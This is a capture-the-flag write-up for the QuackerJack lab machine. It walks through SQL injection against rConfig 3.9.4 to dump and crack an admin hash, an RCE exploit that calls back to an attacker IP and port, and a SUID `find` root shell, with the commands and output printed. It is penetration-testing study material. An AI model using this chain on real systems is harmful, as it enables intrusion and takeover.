# QuackerJack

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.233.57 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 16:48 +08
Nmap scan report for 192.168.233.57
Host is up (0.17s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8081/tcp open  blackice-icecap
```

### FTP Anonymous Fail

The FTP service does allow anonymous logins, but it just hangs:

```
$ ftp 192.168.233.57
Connected to 192.168.233.57.
220 (vsFTPd 3.0.2)
Name (192.168.233.57:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32438|).
```

Nothing much there.

### SQL Injection -> RCE

Port 8081 was hosting an `rConfig` instance:

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

This version was vulnerable to a few exploits:

```
$ searchsploit rConfig 3.9.4
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection | php/webapps/48241.py
rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote  | php/webapps/48261.py
----------------------------------------------------------- ---------------------------------
```

The bottom one just didn't work, while the top one requires credentials to work. There a few other exploits that I found online, such as an SQL Injection here:

{% embed url="https://www.exploit-db.com/exploits/48208" %}

The above exploit was tested on Version 3.9.4, so it should work.

```
$ python3 sql.py https://192.168.233.57:8081
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.233.57:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
```

The above hash is crackable on CrackStation.

<figure><img src="../../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

We can then run the RCE exploit `48241.py`:

```
$ python3 48241.py https://192.168.233.57:8081 admin abgrtyu 192.168.45.161 21
```

<figure><img src="../../../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

## Privilege Escalation

### Find SUID -> Root Shell

We can enumerate for SUID binaries on this machine:

```
bash-4.2$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

We can run `find` as the `root` user. Following GTFOBins, we just need to run this:

```
./find . -exec /bin/sh -p \; -quit
```

<figure><img src="../../../.gitbook/assets/image (3208).png" alt=""><figcaption></figcaption></figure>

Rooted!
